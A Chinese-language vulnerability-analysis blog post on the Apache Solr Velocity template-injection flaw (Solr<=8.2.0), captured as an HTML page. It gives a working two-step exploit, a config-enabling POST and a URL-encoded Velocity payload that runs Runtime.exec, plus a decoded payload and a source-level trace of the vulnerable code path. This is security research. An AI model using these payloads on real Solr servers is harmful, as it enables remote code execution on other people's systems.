@@ -1,0 +1,851 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=7.4.0">
+  <link rel="mask-icon" href="/images/avatar.svg?v=7.4.0" color="#222">
+  <link rel="alternate" href="/atom.xml" title="Anemone's Blog" type="application/atom+xml">
+  <meta name="google-site-verification" content="Re5JdegRYzNFco-rC9lYIsvSWIgh5JvyfhuEaZCeFCk">
+  <meta name="baidu-site-verification" content="opTC8YN3Pn">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.0">
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@4/css/font-awesome.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '7.4.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: 'GB90MXPJ1C',
+      apiKey: '05d808da3baf50ac2f2fad2dc3a3cd8f',
+      indexName: 'dev_blog',
+      hits: {"per_page":20},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="环境搭建下载受影响版本的solr，这里依然选择v8.1.0，这里注意除了添加solr的jar还需要添加velocity的（源码的化可以让IDEA从maven上下源码）：同样的方法启动项目1234anemone@ANEMONE-ASUS:/mnt/d/Store/document/all_my_work/solr/solr-8.1.0$ cd server/ #一定要在server下运行anemon">
+<meta name="keywords" content="漏洞分析,Solr">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Solr Velocity模板注入漏洞分析">
+<meta property="og:url" content="http://anemone.top/vulnresearch-Solr_Velocity_injection/index.html">
+<meta property="og:site_name" content="Anemone&#39;s Blog">
+<meta property="og:description" content="环境搭建下载受影响版本的solr，这里依然选择v8.1.0，这里注意除了添加solr的jar还需要添加velocity的（源码的化可以让IDEA从maven上下源码）：同样的方法启动项目1234anemone@ANEMONE-ASUS:/mnt/d/Store/document/all_my_work/solr/solr-8.1.0$ cd server/ #一定要在server下运行anemon">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://anemone.top/vulnresearch-Solr_Velocity_injection/image-20191124205421987.png">
+<meta property="og:image" content="http://anemone.top/vulnresearch-Solr_Velocity_injection/image-20191124164155298.png">
+<meta property="og:image" content="http://anemone.top/vulnresearch-Solr_Velocity_injection/image-20191124175443383.png">
+<meta property="og:image" content="http://anemone.top/vulnresearch-Solr_Velocity_injection/image-20191124175720679.png">
+<meta property="og:image" content="http://anemone.top/vulnresearch-Solr_Velocity_injection/image-20191124181632402.png">
+<meta property="og:image" content="http://anemone.top/vulnresearch-Solr_Velocity_injection/image-20191124184425485.png">
+<meta property="og:image" content="http://anemone.top/vulnresearch-Solr_Velocity_injection/image-20191124184911792.png">
+<meta property="og:image" content="http://anemone.top/vulnresearch-Solr_Velocity_injection/image-20191124185248960.png">
+<meta property="og:image" content="http://anemone.top/vulnresearch-Solr_Velocity_injection/image-20191124190358485.png">
+<meta property="og:image" content="http://anemone.top/vulnresearch-Solr_Velocity_injection/image-20191124210507568.png">
+<meta property="og:image" content="http://anemone.top/vulnresearch-Solr_Velocity_injection/image-20191124211628918.png">
+<meta property="og:image" content="http://anemone.top/vulnresearch-Solr_Velocity_injection/image-20191124212157913.png">
+<meta property="og:image" content="http://anemone.top/vulnresearch-Solr_Velocity_injection/image-20191124205548129.png">
+<meta property="og:image" content="http://anemone.top/vulnresearch-Solr_Velocity_injection/image-20191208165035876.png">
+<meta property="og:image" content="http://anemone.top/vulnresearch-Solr_Velocity_injection/image-20191208172313550.png">
+<meta property="og:image" content="http://anemone.top/vulnresearch-Solr_Velocity_injection/image-20191208200421304.png">
+<meta property="og:image" content="http://anemone.top/vulnresearch-Solr_Velocity_injection/image-20191208194710665.png">
+<meta property="og:updated_time" content="2021-04-26T13:55:29.400Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Solr Velocity模板注入漏洞分析">
+<meta name="twitter:description" content="环境搭建下载受影响版本的solr，这里依然选择v8.1.0，这里注意除了添加solr的jar还需要添加velocity的（源码的化可以让IDEA从maven上下源码）：同样的方法启动项目1234anemone@ANEMONE-ASUS:/mnt/d/Store/document/all_my_work/solr/solr-8.1.0$ cd server/ #一定要在server下运行anemon">
+<meta name="twitter:image" content="http://anemone.top/vulnresearch-Solr_Velocity_injection/image-20191124205421987.png">
+  <link rel="canonical" href="http://anemone.top/vulnresearch-Solr_Velocity_injection/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>Solr Velocity模板注入漏洞分析 | Anemone's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Anemone's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a href="javascript:;" class="popup-trigger">
+        
+          <i class="fa fa-search fa-fw"></i>搜索</a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input" id="search-input"></div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="algolia-results">
+  <div id="algolia-stats"></div>
+  <div id="algolia-hits"></div>
+  <div id="algolia-pagination" class="algolia-pagination"></div>
+</div>
+
+  
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+      <article itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block post">
+    <link itemprop="mainEntityOfPage" href="http://anemone.top/vulnresearch-Solr_Velocity_injection/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Anemone">
+      <meta itemprop="description" content="关注Web安全、移动安全、Fuzz测试和机器学习">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Anemone's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">Solr Velocity模板注入漏洞分析
+
+          
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              
+                
+              
+
+              <time title="创建时间：2019-11-03 20:30:49" itemprop="dateCreated datePublished" datetime="2019-11-03T20:30:49+08:00">2019-11-03</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-04-26 21:55:29" itemprop="dateModified" datetime="2021-04-26T21:55:29+08:00">2021-04-26</time>
+              </span>
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/漏洞分析/" itemprop="url" rel="index"><span itemprop="name">漏洞分析</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            <span id="/vulnresearch-Solr_Velocity_injection/" class="post-meta-item leancloud_visitors" data-flag-title="Solr Velocity模板注入漏洞分析" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>下载受影响版本的solr，这里依然选择v8.1.0，这里注意除了添加solr的jar还需要添加velocity的（源码的化可以让IDEA从maven上下源码）：</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124205421987.png" alt="image-20191124205421987"></p><p>同样的方法启动项目</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">anemone@ANEMONE-ASUS:/mnt/d/Store/document/all_my_work/solr/solr-8.1.0</span><br><span class="line">$ <span class="built_in">cd</span> server/ <span class="comment">#一定要在server下运行</span></span><br><span class="line">anemone@ANEMONE-ASUS:/mnt/d/Store/document/all_my_work/solr/solr-8.1.0/server</span><br><span class="line">$ java <span class="string">"-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=9000"</span> -Dsolr.solr.home=<span class="string">"../example/example-DIH/solr/"</span> -jar start.jar --module=http</span><br></pre></td></tr></table></figure><a id="more"></a>
+
+
+
+<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><h2 id="0x00-检查core是否允许velocity"><a href="#0x00-检查core是否允许velocity" class="headerlink" title="0x00  检查core是否允许velocity"></a>0x00  检查core是否允许velocity</h2><p>检查<code>{core}/conf/solrconfig.xml</code>中是否允许solr.VelocityResponseWriter，具体来说，检查是否有如下配置：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">config</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 一定要加依赖，否则会报错400，找不到velocity类 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">lib</span> <span class="attr">dir</span>=<span class="string">"$&#123;solr.install.dir:../../../..&#125;/contrib/velocity/lib"</span> <span class="attr">regex</span>=<span class="string">".*\.jar"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">lib</span> <span class="attr">dir</span>=<span class="string">"$&#123;solr.install.dir:../../../..&#125;/dist/"</span> <span class="attr">regex</span>=<span class="string">"solr-velocity-\d.*\.jar"</span> /&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 开启velocityResponse --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">queryResponseWriter</span> <span class="attr">name</span>=<span class="string">"velocity"</span> <span class="attr">class</span>=<span class="string">"solr.VelocityResponseWriter"</span> <span class="attr">startup</span>=<span class="string">"lazy"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">str</span> <span class="attr">name</span>=<span class="string">"template.base.dir"</span>&gt;</span>$&#123;velocity.template.base.dir:&#125;<span class="tag">&lt;/<span class="name">str</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">queryResponseWriter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">config</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>如果没有需要加上，并且重启solr</p>
+<h2 id="0x01-设置params-resource-loader-enabled-true"><a href="#0x01-设置params-resource-loader-enabled-true" class="headerlink" title="0x01 设置params.resource.loader.enabled=true"></a>0x01 设置params.resource.loader.enabled=true</h2><p>设置VelocityResponseWriter插件的params.resource.loader.enabled选项设置为true，即允许在Solr请求参数中允许模板：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/solr/tika/config</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: localhost:8983</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="attribute">Content-Length</span>: 259</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  "update-queryresponsewriter": &#123;</span><br><span class="line">    "startup": "lazy",</span><br><span class="line">    "name": "velocity",</span><br><span class="line">    "class": "solr.VelocityResponseWriter",</span><br><span class="line">    "template.base.dir": "",</span><br><span class="line">    "solr.resource.loader.enabled": "true",</span><br><span class="line">    "params.resource.loader.enabled": "true"</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>服务返回200并且观察到<code>${solr_home}/example/example-DIH/solr/tika/conf</code>下出现<code>configoverlay.json</code>表示设置成功。</p>
+<h2 id="0x02-通过Velocity模板注入进行RCE"><a href="#0x02-通过Velocity模板注入进行RCE" class="headerlink" title="0x02 通过Velocity模板注入进行RCE"></a>0x02 通过Velocity模板注入进行RCE</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/solr/tika/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: localhost.com:8983</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure>
+<p>返回包中看到命令执行结果：</p>
+<p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124164155298.png" alt="image-20191124164155298"></p>
+<h3 id="Velocity-RCE方法"><a href="#Velocity-RCE方法" class="headerlink" title="Velocity RCE方法"></a>Velocity RCE方法</h3><p>urldecode一下，可以看到velocity进行RCE的payload，留着以后可能有用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#set($x=&apos;&apos;) </span><br><span class="line">#set($rt=$x.class.forName(&apos;java.lang.Runtime&apos;)) </span><br><span class="line">#set($chr=$x.class.forName(&apos;java.lang.Character&apos;)) </span><br><span class="line">#set($str=$x.class.forName(&apos;java.lang.String&apos;)) </span><br><span class="line">#set($ex=$rt.getRuntime().exec(&apos;id&apos;))+$ex.waitFor() </span><br><span class="line">#set($out=$ex.getInputStream()) </span><br><span class="line">#foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end</span><br></pre></td></tr></table></figure>
+<h1 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h1><p>Solr&lt;=8.2.0 且core允许velocity模板。</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="solr-core-config"><a href="#solr-core-config" class="headerlink" title="/solr/{core}/config"></a>/solr/{core}/config</h2><p>还是跟上次一样，断点下在org.apache.solr.servlet.HttpSolrCall#call:519这里，调试第一个请求，还是通过如下调用栈，交给handler处理请求：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">org.apache.solr.servlet.HttpSolrCall#call:542</span><br><span class="line">  org.apache.solr.servlet.HttpSolrCall#execute():756</span><br><span class="line">    org.apache.solr.core.SolrCore#execute:2566</span><br><span class="line">      org.apache.solr.request.SolrRequestHandler#handleRequest:199</span><br><span class="line">        org.apache.solr.handler.SolrConfigHandler#handleRequestBody</span><br></pre></td></tr></table></figure>
+<p>可以看到，这此处理的handler是SolrConfigHandler，其将接受的post参数创建为command对象（129行），然后调用它的handlePOST()方法：</p>
+<p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124175443383.png" alt="image-20191124175443383"></p>
+<p>handlePOST()方法如下，其获取command的操作，以及需要覆盖的原配置，调Command#handleCommands：</p>
+<p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124175720679.png" alt="image-20191124175720679"></p>
+<p>Command#handleCommands(ops, overlay)，其是一个switch-case结构，这里走的是默认分支，然后调用Command#updateNamedPlugin更新之前的配置（overlay变量），再将配置保存到zk或者本地：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">handleCommands</span><span class="params">(List&lt;CommandOperation&gt; ops, ConfigOverlay overlay)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (CommandOperation op : ops) &#123;</span><br><span class="line">      <span class="keyword">switch</span> (op.name) &#123;</span><br><span class="line"><span class="comment">/*...*/</span></span><br><span class="line">        <span class="keyword">default</span>: &#123;</span><br><span class="line">          List&lt;String&gt; pcs = StrUtils.splitSmart(op.name.toLowerCase(Locale.ROOT), <span class="string">'-'</span>);</span><br><span class="line">          <span class="keyword">if</span> (pcs.size() != <span class="number">2</span>) &#123;<span class="comment">/*...*/</span>&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            String prefix = pcs.get(<span class="number">0</span>);</span><br><span class="line">            String name = pcs.get(<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmdPrefixes.contains(prefix) &amp;&amp; namedPlugins.containsKey(name)) &#123;</span><br><span class="line">              SolrConfig.SolrPluginInfo info = namedPlugins.get(name);</span><br><span class="line">              <span class="keyword">if</span> (<span class="string">"delete"</span>.equals(prefix)) &#123;</span><br><span class="line">                overlay = deleteNamedComponent(op, overlay, info.getCleanTag());</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                overlay = updateNamedPlugin(info, op, overlay, prefix.equals(<span class="string">"create"</span>) || prefix.equals(<span class="string">"add"</span>)); <span class="comment">//这里更新配置（overlay变量）</span></span><br><span class="line">              &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              op.unknownOperation();</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    List errs = CommandOperation.captureErrors(ops);</span><br><span class="line">    <span class="keyword">if</span> (!errs.isEmpty()) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">    SolrResourceLoader loader = req.getCore().getResourceLoader();</span><br><span class="line">    <span class="keyword">if</span> (loader <span class="keyword">instanceof</span> ZkSolrResourceLoader) &#123;<span class="comment">/*...*/</span>&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      SolrResourceLoader.persistConfLocally(loader, ConfigOverlay.RESOURCE_NAME, overlay.toByteArray()); <span class="comment">// 将配置保存到本地</span></span><br><span class="line">      req.getCore().getCoreContainer().reload(req.getCore().getName()); <span class="comment">// 更新配置</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>28行（实际代码504行）会将配置保存到本地，也就是<code>{core}/conf/configoverlay.json</code>文件了。</p>
+<p>那么总结一下调用栈就是：</p>
+<p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124181632402.png" alt="image-20191124181632402"></p>
+<h2 id="solr-core-select"><a href="#solr-core-select" class="headerlink" title="/solr/{core}/select"></a>/solr/{core}/select</h2><p> 这个API原先应该是数据库查询用的，但现在由于允许了执行参数中指定的velocity，造成了SSTI，我们重新看一下org.apache.solr.servlet.HttpSolrCall#call方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Action <span class="title">call</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  <span class="comment">/*...*/</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (cores == <span class="keyword">null</span>) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">  <span class="keyword">if</span> (solrDispatchFilter.abortErrorMessage != <span class="keyword">null</span>)&#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="comment">/*...*/</span></span><br><span class="line">    HttpServletResponse resp = response;</span><br><span class="line">    <span class="keyword">switch</span> (action) &#123;</span><br><span class="line">      <span class="keyword">case</span> ADMIN:</span><br><span class="line">        handleAdminRequest();</span><br><span class="line">        <span class="keyword">return</span> RETURN;</span><br><span class="line">      <span class="keyword">case</span> REMOTEQUERY:</span><br><span class="line">        SolrRequestInfo.setRequestInfo(<span class="keyword">new</span> SolrRequestInfo(req, <span class="keyword">new</span> SolrQueryResponse()));</span><br><span class="line">        remoteQuery(coreUrl + path, resp);</span><br><span class="line">        <span class="keyword">return</span> RETURN;</span><br><span class="line">      <span class="keyword">case</span> PROCESS:</span><br><span class="line">        <span class="keyword">final</span> Method reqMethod = Method.getMethod(req.getMethod());</span><br><span class="line">        HttpCacheHeaderUtil.setCacheControlHeader(config, resp, reqMethod);</span><br><span class="line">        <span class="comment">// unless we have been explicitly told not to, do cache validation</span></span><br><span class="line">        <span class="comment">// if we fail cache validation, execute the query</span></span><br><span class="line">        <span class="keyword">if</span> (config.getHttpCachingConfig().isNever304() ||</span><br><span class="line">            !HttpCacheHeaderUtil.doCacheHeaderValidation(solrReq, req, reqMethod, resp)) &#123;</span><br><span class="line">          SolrQueryResponse solrRsp = <span class="keyword">new</span> SolrQueryResponse();<span class="comment">//VelocityResopnseWriter</span></span><br><span class="line">          SolrRequestInfo.setRequestInfo(<span class="keyword">new</span> SolrRequestInfo(solrReq, solrRsp));</span><br><span class="line">          execute(solrRsp);</span><br><span class="line">          <span class="comment">/*...*/</span></span><br><span class="line">          writeResponse(solrRsp, responseWriter, reqMethod); <span class="comment">//SSTI</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> RETURN;</span><br><span class="line">      <span class="keyword">default</span>: <span class="keyword">return</span> action;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (Throwable ex) <span class="comment">/*...*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>引发SSTI的关键在于第26行（源程序第556行），其调用了HttpSolrCall#getResponseWriter，获取到VelocityResponseWriter，和30行（源程序558行），其会通过HttpSolrCall#writeResponse将Request中参数渲染到页面。</p>
+<p>先看HttpSolrCall#getResponseWriter：</p>
+<p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124184425485.png" alt="image-20191124184425485"></p>
+<p>逻辑很简单，就是从参数<code>wt</code>中获取模板，然后返回对应模板——注意到PoC中的<code>wt=velocity</code></p>
+<p>再看HttpSolrCall#writeResponse：</p>
+<p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124184911792.png" alt="image-20191124184911792"></p>
+<p>其调用了QueryResponseWriterUtil#writeQueryResponse()，将solrReq，solrRsp写成HTTP Response，ct是content-type。</p>
+<p>HttpSolrCall#writeResponse()调用QueryResponseWriterUtil#writeQueryResponse()，先生产一个OutputStreamWriter，然后用responseWriter写入内容：</p>
+<p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124185248960.png" alt="image-20191124185248960"></p>
+<p>再跟进去就到了VelocityResponseWriter#write：</p>
+<p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124190358485.png" alt="image-20191124190358485"></p>
+<h3 id="VelocityResponseWriter-createEngine"><a href="#VelocityResponseWriter-createEngine" class="headerlink" title="VelocityResponseWriter#createEngine"></a>VelocityResponseWriter#createEngine</h3><p>在VelocityResponseWriter#createEngine中，如果<code>paramsResourceLoaderEnabled</code>，那么<code>params.resource.loader.instance=new SolrParamResourceLoader(request)</code>，如果<code>solrResourceLoaderEnabled</code>，那么<code>solr.resource.loader.instance=solrResourceLader</code></p>
+<p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124210507568.png" alt="image-20191124210507568"></p>
